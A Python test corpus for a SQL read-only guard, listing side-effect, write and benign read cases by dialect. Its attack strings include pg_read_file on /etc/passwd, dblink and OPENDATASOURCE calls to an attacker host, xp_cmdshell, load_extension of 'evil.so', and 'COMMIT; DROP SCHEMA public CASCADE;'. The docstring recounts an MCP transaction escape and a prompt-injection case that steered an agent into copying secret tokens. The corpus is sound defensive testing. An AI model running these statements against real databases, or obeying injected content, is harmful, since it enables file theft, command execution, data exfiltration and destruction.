"""The trust benchmark's corpus: SQL that MUST be refused, and SQL that must not.

This is the single source the guard tests, the `trust-benchmark` CLI, and the
published results page all read from - so the number on the website is computed
from the same cases CI runs on every commit, and cannot drift away from them.

Every "side_effect" and "write" case is refused by the guard; every "read" case
is allowed (a guard that blocks real work is useless). The side-effect cases are
the ones that matter most: each is a perfectly well-formed SELECT that a guard
inspecting only a statement's SHAPE waves straight through - and every one was
verified to do exactly that against this project's own guard before it grew a
function check. They are kept here by name so the claim stays a fact, not a
slogan.

Nothing here is novel: these are documented PostgreSQL / SQL Server / MySQL /
SQLite built-ins. The point is not the functions - it is that "read-only in
prose" does not survive contact with them, and measuring your own guard against
them is the only honest way to claim it does.

Two of these cases are the exact failures that made the news. The MCP world's
most-cited read-only bypass is a transaction escape: Anthropic's reference
PostgreSQL MCP server ran queries inside `BEGIN TRANSACTION READ ONLY`, but the
driver accepted stacked statements, so `COMMIT; DROP SCHEMA public CASCADE;`
closed the read-only transaction and ran with full rights (found by Datadog
Security Labs; Anthropic archived the server in May 2025). And the Supabase MCP
"lethal trifecta" incident turned on the WRITE leg - injected content steering an
agent to copy a secrets table into an attacker-readable row. Both are here, both
refused: a guard that inspects the statement, not merely a read-only DB role.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Case:
    name: str
    dialect: str          # sqlglot dialect: postgres / tsql / mysql / sqlite
    sql: str
    kind: str             # "side_effect" | "write" | "read"
    severity: str         # "critical" | "high" | "medium" | "-" (reads)
    why: str

    @property
    def must_block(self) -> bool:
        return self.kind in ("side_effect", "write")


# Well-formed SELECTs that are not reads. A shape-only guard passes every one.
SIDE_EFFECTS = [
    Case("pg_read_file", "postgres", "SELECT pg_read_file('/etc/passwd')",
         "side_effect", "critical", "reads an arbitrary server file straight off disk"),
    Case("lo_export", "postgres", "SELECT lo_export(lo_import('/etc/passwd'), '/tmp/x')",
         "side_effect", "critical", "WRITES a server file - a SELECT that mutates the filesystem"),
    Case("dblink", "postgres", "SELECT * FROM dblink('host=attacker','SELECT 1') AS t(x int)",
         "side_effect", "critical", "opens an outbound connection: SSRF and a data-exfiltration channel"),
    Case("set_config", "postgres", "SELECT set_config('default_transaction_read_only','off',false)",
         "side_effect", "critical", "switches the read-only session backstop OFF from inside a SELECT"),
    Case("query_to_xml", "postgres", "SELECT query_to_xml('SELECT 1', true, false, '')",
         "side_effect", "high", "re-enters the executor with an arbitrary SQL string"),
    Case("pg_sleep", "postgres", "SELECT pg_sleep(100000)",
         "side_effect", "medium", "ties up a connection indefinitely - denial of service"),
    Case("xp_cmdshell", "tsql", "SELECT * FROM orders WHERE 1=1; EXEC xp_cmdshell 'whoami'",
         "side_effect", "critical", "SQL Server shell execution - and Logo, Netsis and Mikro all run on SQL Server"),
    Case("sp_oacreate", "tsql", "DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUT",
         "side_effect", "critical", "OLE automation: another SQL Server path to arbitrary code"),
    Case("openrowset", "tsql", "SELECT * FROM OPENROWSET(BULK 'C:/Windows/win.ini', SINGLE_CLOB) AS x",
         "side_effect", "critical", "reads a host file; sqlglot cannot even parse it, so the lexical net catches it"),
    Case("openquery", "tsql", "SELECT * FROM OPENQUERY(srv, 'SELECT 1')",
         "side_effect", "high", "runs SQL on a linked server - a pivot off the reporting box"),
    Case("opendatasource", "tsql",
         "SELECT * FROM OPENDATASOURCE('SQLNCLI','Server=attacker;Trusted_Connection=yes').db.dbo.t",
         "side_effect", "high", "ad-hoc connection to an attacker-named server"),
    Case("load_file", "mysql", "SELECT LOAD_FILE('/etc/passwd')",
         "side_effect", "critical", "reads a server file into the result set"),
    Case("sleep", "mysql", "SELECT SLEEP(100000)",
         "side_effect", "medium", "denial of service; MySQL had no statement timeout to stop it"),
    Case("benchmark", "mysql", "SELECT BENCHMARK(1000000, MD5('x'))",
         "side_effect", "medium", "CPU-burning denial of service"),
    Case("load_extension", "sqlite", "SELECT load_extension('evil.so')",
         "side_effect", "critical", "loads a shared library - arbitrary code execution"),
    Case("sys_exec", "mysql", "SELECT sys_exec('id')",
         "side_effect", "critical", "a MySQL UDF that shells out - command execution where the UDF is installed"),
    Case("comment_obfuscation", "postgres", "SELECT/**/pg_read_file('/etc/passwd')",
         "side_effect", "high", "pg_read_file with a comment spliced in to dodge a name scan - the comment guard refuses it first"),
]

# Writes and multi-statement tricks a keyword scan alone might miss.
WRITES = [
    Case("commit_drop", "postgres", "COMMIT; DROP SCHEMA public CASCADE;",
         "write", "critical", "THE famous one: the read-only transaction ESCAPE that got Anthropic's "
         "reference Postgres MCP server archived (Datadog, 2025) - refused as a second statement"),
    Case("trifecta_exfil", "postgres", "INSERT INTO tickets(body) SELECT token FROM integration_tokens",
         "write", "critical", "the Supabase 'lethal trifecta' write leg - injected content steering an agent "
         "to copy secrets into an attacker-readable row; a guard denies the write a read-only role might not"),
    Case("drop", "postgres", "DROP TABLE orders",
         "write", "critical", "destroys a table"),
    Case("cte_insert", "postgres", "WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x",
         "write", "critical", "a write hidden inside a CTE, wrapped in a SELECT"),
    Case("two_statements", "postgres", "SELECT 1; DROP TABLE t",
         "write", "critical", "a second statement smuggled behind a read"),
    Case("select_into", "tsql", "SELECT * INTO backup FROM orders",
         "write", "high", "SELECT ... INTO creates and populates a new table"),
    Case("comment", "postgres", "SELECT 1 -- and then some",
         "write", "medium", "a trailing comment: refused as injection hygiene"),
    Case("update", "postgres", "UPDATE orders SET net_total = 0",
         "write", "critical", "the obvious case - mutates rows"),
    Case("lock_hint", "tsql", "SELECT * FROM orders WITH (TABLOCKX)",
         "write", "high", "an exclusive lock hint escalates a read into a blocker"),
    Case("into_outfile", "mysql", "SELECT a INTO OUTFILE '/tmp/x' FROM t",
         "write", "high", "SELECT ... INTO OUTFILE writes the result to a server file - a MySQL exfiltration primitive"),
    Case("copy_to", "postgres", "COPY (SELECT 1) TO '/tmp/x'",
         "write", "high", "COPY ... TO writes a server file; it isn't a SELECT/WITH, so it never clears the head check"),
]

# Legitimate analytics the guard must NOT block. A guard that fails these is
# useless - so they earn a place in the benchmark exactly like the attacks.
READS = [
    Case("aggregate", "postgres", "SELECT customer, SUM(net_total) FROM orders GROUP BY customer",
         "read", "-", "grouped aggregate - the bread and butter of a report"),
    Case("join", "tsql", "SELECT o.order_id, l.qty FROM orders o JOIN order_lines l ON l.order_id = o.order_id",
         "read", "-", "a two-table join"),
    Case("cte_window", "tsql",
         "WITH r AS (SELECT ROW_NUMBER() OVER (ORDER BY d) n FROM t) SELECT * FROM r WHERE n = 1",
         "read", "-", "a CTE with a window function - reads, despite the machinery"),
    Case("union", "postgres", "SELECT a FROM t1 UNION SELECT a FROM t2",
         "read", "-", "a UNION of two reads"),
    Case("case_coalesce", "mysql", "SELECT CASE WHEN x > 0 THEN COALESCE(y, 0) ELSE 0 END FROM t",
         "read", "-", "CASE and COALESCE - recognised functions, allowed"),
    Case("literal_keyword", "postgres", "SELECT 'please delete this note' AS note",
         "read", "-", "a write keyword INSIDE a string literal is data, not code"),
    Case("date_bucket", "postgres", "SELECT date_trunc('week', order_date), COUNT(*) FROM orders GROUP BY 1",
         "read", "-", "date_trunc + COUNT - the time-bucketing at the heart of a weekly report"),
    Case("top_ordered", "tsql",
         "SELECT TOP 10 customer, SUM(net_total) FROM orders GROUP BY customer ORDER BY 2 DESC",
         "read", "-", "TOP with ORDER BY - a ranked read, allowed"),
]

CASES = [*SIDE_EFFECTS, *WRITES, *READS]


def run(assert_read_only) -> list[dict]:
    """Run every case through a guard function and return per-case results.

    Takes the guard as an argument rather than importing it, so a caller can
    point the same corpus at a different implementation and compare.
    """
    from .connect import ReadOnlyViolation

    out: list[dict] = []
    for c in CASES:
        blocked, reason = False, ""
        try:
            assert_read_only(c.sql, dialect=c.dialect)
        except ReadOnlyViolation as e:
            blocked, reason = True, str(e)
        except Exception as e:   # any other error still means "did not pass"
            blocked, reason = True, f"{type(e).__name__}: {e}"
        out.append({
            "name": c.name, "dialect": c.dialect, "kind": c.kind,
            "severity": c.severity, "why": c.why,
            "expected_block": c.must_block, "blocked": blocked,
            "correct": blocked == c.must_block, "reason": reason,
        })
    return out


def summarize(results: list[dict]) -> dict:
    attacks = [r for r in results if r["expected_block"]]
    reads = [r for r in results if not r["expected_block"]]
    return {
        "attacks_total": len(attacks),
        "attacks_blocked": sum(1 for r in attacks if r["blocked"]),
        "reads_total": len(reads),
        "reads_allowed": sum(1 for r in reads if not r["blocked"]),
        "all_correct": all(r["correct"] for r in results),
    }


def compare(guards: dict) -> list[dict]:
    """Summarize the whole corpus through several guards - one row per guard.

    `guards` maps a label to a guard callable with the same `(sql, dialect=...)`
    shape as the engine's `assert_read_only`. Returns a summary row per guard in
    the given order, so the CLI and the results page can show the *same* corpus
    walking straight past the shape-only checks that ship in the wild, and not
    past this one. Every number is computed from a live run, like the headline -
    never asserted in prose.
    """
    return [{"guard": label, **summarize(run(fn))} for label, fn in guards.items()]
